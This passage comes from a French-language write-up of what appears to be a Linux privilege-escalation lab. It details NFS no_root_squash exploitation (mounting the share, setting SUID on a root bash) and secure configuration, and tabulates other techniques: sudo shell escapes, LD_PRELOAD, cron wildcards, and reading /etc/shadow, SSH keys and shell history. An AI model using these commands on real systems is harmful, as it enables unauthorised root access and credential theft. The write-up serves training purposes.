client en nobody/nfsnobody sur le serveur - Cela empêche un root client
de manipuler les fichiers en tant que root sur le serveur</p>
<p><strong>no_root_squash :</strong> - Désactive cette protection - Le
root sur le client reste root sur le serveur - Permet de créer des
fichiers SUID appartenant à root</p>
<p><strong>Processus d’exploitation :</strong> 1. Identifiez un partage
NFS avec <code>no_root_squash</code> 2. Montez-le depuis une machine où
vous êtes root 3. Créez un binaire SUID sur le partage (vous êtes root
sur votre machine) 4. Le binaire appartient à root sur le serveur NFS 5.
Exécutez-le sur le serveur pour obtenir un shell root</p>
<h3 id="identification-de-la-vulnérabilité"> Identification de la
vulnérabilité</h3>
<p><strong>Vérifier les exports NFS sur la cible :</strong></p>
<div class="sourceCode" id="cb90"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb90-1"><a href="#cb90-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Lire /etc/exports</span></span>
<span id="cb90-2"><a href="#cb90-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/exports</span>
<span id="cb90-3"><a href="#cb90-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb90-4"><a href="#cb90-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Chercher no_root_squash</span></span>
<span id="cb90-5"><a href="#cb90-5" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="at">-i</span> <span class="st">&quot;no_root_squash&quot;</span> /etc/exports</span>
<span id="cb90-6"><a href="#cb90-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb90-7"><a href="#cb90-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier les partages actifs</span></span>
<span id="cb90-8"><a href="#cb90-8" aria-hidden="true" tabindex="-1"></a><span class="ex">exportfs</span> <span class="at">-v</span></span></code></pre></div>
<p><strong>Configuration vulnérable :</strong></p>
<div class="sourceCode" id="cb91"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb91-1"><a href="#cb91-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp</span> <span class="pp">*(</span>rw,sync,insecure,no_root_squash,no_subtree_check<span class="pp">)</span></span>
<span id="cb91-2"><a href="#cb91-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/home</span> <span class="pp">*(</span>rw,sync,insecure,no_root_squash,no_subtree_check<span class="pp">)</span></span></code></pre></div>
<p><strong>Configuration sécurisée :</strong></p>
<div class="sourceCode" id="cb92"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb92-1"><a href="#cb92-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp</span> <span class="pp">*(</span>rw,sync,insecure,root_squash,no_subtree_check<span class="pp">)</span></span>
<span id="cb92-2"><a href="#cb92-2" aria-hidden="true" tabindex="-1"></a><span class="co"># root_squash est le défaut et doit TOUJOURS être utilisé</span></span></code></pre></div>
<h3 id="options-nfs-importantes"> Options NFS importantes</h3>
<table>
<thead>
<tr class="header">
<th>Option</th>
<th>Description</th>
<th>Sécurité</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>root_squash</td>
<td>Map rootnobody</td>
<td> Sécurisé</td>
</tr>
<tr class="even">
<td>no_root_squash</td>
<td>Root reste root</td>
<td> Dangereux</td>
</tr>
<tr class="odd">
<td>all_squash</td>
<td>Tousnobody</td>
<td> Très sécurisé</td>
</tr>
<tr class="even">
<td>no_all_squash</td>
<td>Garde les UIDs</td>
<td> Défaut</td>
</tr>
<tr class="odd">
<td>sync</td>
<td>Écritures synchrones</td>
<td> Recommandé</td>
</tr>
<tr class="even">
<td>async</td>
<td>Écritures asynchrones</td>
<td> Plus rapide</td>
</tr>
<tr class="odd">
<td>insecure</td>
<td>Ports &gt; 1024</td>
<td> Moins sécurisé</td>
</tr>
<tr class="even">
<td>secure</td>
<td>Ports &lt; 1024</td>
<td> Plus sécurisé</td>
</tr>
</tbody>
</table>
<h3 id="commandes-utiles-nfs"> Commandes utiles NFS</h3>
<div class="sourceCode" id="cb93"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb93-1"><a href="#cb93-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur le serveur NFS</span></span>
<span id="cb93-2"><a href="#cb93-2" aria-hidden="true" tabindex="-1"></a><span class="ex">exportfs</span> <span class="at">-v</span>                    <span class="co"># Voir les exports actifs</span></span>
<span id="cb93-3"><a href="#cb93-3" aria-hidden="true" tabindex="-1"></a><span class="ex">exportfs</span> <span class="at">-ra</span>                   <span class="co"># Recharger /etc/exports</span></span>
<span id="cb93-4"><a href="#cb93-4" aria-hidden="true" tabindex="-1"></a><span class="ex">showmount</span> <span class="at">-e</span> localhost         <span class="co"># Voir les exports locaux</span></span>
<span id="cb93-5"><a href="#cb93-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb93-6"><a href="#cb93-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Sur le client</span></span>
<span id="cb93-7"><a href="#cb93-7" aria-hidden="true" tabindex="-1"></a><span class="ex">showmount</span> <span class="at">-e</span> SERVER_IP         <span class="co"># Voir les exports distants</span></span>
<span id="cb93-8"><a href="#cb93-8" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="at">-t</span> nfs SERVER:/path /mnt <span class="co"># Monter un partage</span></span>
<span id="cb93-9"><a href="#cb93-9" aria-hidden="true" tabindex="-1"></a><span class="fu">umount</span> /mnt                    <span class="co"># Démonter</span></span>
<span id="cb93-10"><a href="#cb93-10" aria-hidden="true" tabindex="-1"></a><span class="fu">df</span> <span class="at">-h</span> <span class="kw">|</span> <span class="fu">grep</span> nfs               <span class="co"># Voir les montages NFS</span></span></code></pre></div>
<h3 id="troubleshooting"> Troubleshooting</h3>
<p><strong>Erreur : Permission denied lors du montage</strong></p>
<div class="sourceCode" id="cb94"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb94-1"><a href="#cb94-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier que vous êtes root</span></span>
<span id="cb94-2"><a href="#cb94-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> mount <span class="at">-o</span> rw VICTIM_IP:/tmp /tmp/nfs_mount</span></code></pre></div>
<p><strong>Erreur : mount.nfs: access denied by server</strong></p>
<div class="sourceCode" id="cb95"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb95-1"><a href="#cb95-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Le serveur filtre peut-être les IPs</span></span>
<span id="cb95-2"><a href="#cb95-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier /etc/exports sur le serveur:</span></span>
<span id="cb95-3"><a href="#cb95-3" aria-hidden="true" tabindex="-1"></a><span class="co"># /tmp 192.168.1.0/24(rw,no_root_squash)  # Autorise seulement ce réseau</span></span></code></pre></div>
<p><strong>Erreur : SUID bit not set</strong></p>
<div class="sourceCode" id="cb96"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb96-1"><a href="#cb96-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier que vous êtes root lors du chmod</span></span>
<span id="cb96-2"><a href="#cb96-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> chmod +s /tmp/nfs_mount/rootbash</span>
<span id="cb96-3"><a href="#cb96-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb96-4"><a href="#cb96-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier que le partage n&#39;a pas l&#39;option nosuid</span></span>
<span id="cb96-5"><a href="#cb96-5" aria-hidden="true" tabindex="-1"></a><span class="fu">mount</span> <span class="kw">|</span> <span class="fu">grep</span> nfs</span>
<span id="cb96-6"><a href="#cb96-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Si vous voyez nosuid, essayez de remonter:</span></span>
<span id="cb96-7"><a href="#cb96-7" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> mount <span class="at">-o</span> remount,suid VICTIM_IP:/tmp /tmp/nfs_mount</span></code></pre></div>
<p><strong>Le binaire ne donne pas de shell root</strong></p>
<div class="sourceCode" id="cb97"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb97-1"><a href="#cb97-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Utiliser -p avec bash</span></span>
<span id="cb97-2"><a href="#cb97-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/rootbash</span> <span class="at">-p</span></span>
<span id="cb97-3"><a href="#cb97-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb97-4"><a href="#cb97-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou utiliser un programme C qui appelle setuid(0) explicitement</span></span></code></pre></div>
<h3 id="réponse-18"> Réponse</h3>
<p>Shell root obtenu via exploitation de NFS no_root_squash</p>
<hr />
<h2 id="résumé-des-techniques"> Résumé des techniques</h2>
<table>
<thead>
<tr class="header">
<th>Task</th>
<th>Technique</th>
<th>Commande clé</th>
<th>Difficulté</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>3</td>
<td>Kernel Exploit</td>
<td><code>./dirty</code></td>
<td></td>
</tr>
<tr class="even">
<td>4</td>
<td>Config Files</td>
<td><code>grep -r "password"</code></td>
<td></td>
</tr>
<tr class="odd">
<td>5</td>
<td>History</td>
<td><code>cat ~/.bash_history</code></td>
<td></td>
</tr>
<tr class="even">
<td>6</td>
<td>Weak Permissions</td>
<td><code>ls -la /etc/shadow</code></td>
<td></td>
</tr>
<tr class="odd">
<td>7</td>
<td>SSH Keys</td>
<td><code>find / -name id_rsa</code></td>
<td></td>
</tr>
<tr class="even">
<td>8</td>
<td>Sudo Shell Escape</td>
<td><code>sudo vim -c ':!/bin/bash'</code></td>
<td></td>
</tr>
<tr class="odd">
<td>9</td>
<td>Sudo Abuse</td>
<td><code>sudo apache2 -f /etc/shadow</code></td>
<td></td>
</tr>
<tr class="even">
<td>10</td>
<td>LD_PRELOAD</td>
<td><code>sudo LD_PRELOAD=/tmp/shell.so</code></td>
<td></td>
</tr>
<tr class="odd">
<td>11</td>
<td>SUID SO Injection</td>
<td><code>strace + .so malveillante</code></td>
<td></td>
</tr>
<tr class="even">
<td>12</td>
<td>SUID Symlinks</td>
<td><code>export PATH=/tmp:$PATH</code></td>
<td></td>
</tr>
<tr class="odd">
<td>13</td>
<td>SUID Env Var #1</td>
<td><code>export PATH=/tmp:$PATH</code></td>
<td></td>
</tr>
<tr class="even">
<td>14</td>
<td>SUID Env Var #2</td>
<td><code>function /usr/sbin/service</code></td>
<td></td>
</tr>
<tr class="odd">
<td>15</td>
<td>Capabilities</td>
<td><code>getcap -r /</code></td>
<td></td>
</tr>
<tr class="even">
<td>16</td>
<td>Cron Path</td>
<td>Modifier PATH + attendre cron</td>
<td></td>
</tr>
<tr class="odd">
<td>17</td>
<td>Cron Wildcards</td>
<td><code>touch -- --checkpoint=1</code></td>
<td></td>
</tr>
<tr class="even">
<td>18</td>
<td>Cron Overwrite</td>
<td>Modifier script cron</td>
<td></td>
</tr>
<tr class="odd">
<td>19</td>
<td>NFS no_root_squash</td>
<td>Monter NFS + créer SUID</td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="conseils-généraux"> Conseils généraux</h2>
<ol type="1">
<li><p><strong>Toujours commencer par l’énumération</strong></p>
<div class="sourceCode" id="cb98"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb98-1"><a href="#cb98-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-l</span></span>
<span id="cb98-2"><a href="#cb98-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-perm</span> <span class="at">-4000</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb98-3"><a href="#cb98-3" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/crontab</span>
<span id="cb98-4"><a href="#cb98-4" aria-hidden="true" tabindex="-1"></a><span class="ex">getcap</span> <span class="at">-r</span> / <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div></li>
<li><p><strong>Utiliser GTFOBins</strong> :
https://gtfobins.github.io/</p></li>
<li><p><strong>Automatiser avec LinPEAS</strong> :</p>
<div class="sourceCode" id="cb99"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb99-1"><a href="#cb99-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span>
<span id="cb99-2"><a href="#cb99-2" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x linpeas.sh</span>
<span id="cb99-3"><a href="#cb99-3" aria-hidden="true" tabindex="-1"></a><span class="ex">./linpeas.sh</span></span></code></pre></div></li>
<li><p><strong>Toujours vérifier les permissions</strong> avant de
modifier des fichiers</p></li>
<li><p><strong>Documenter vos findings</strong> au fur et à
mesure</p></li>
</ol>
<hr />
<p><strong>Félicitations !</strong></p>
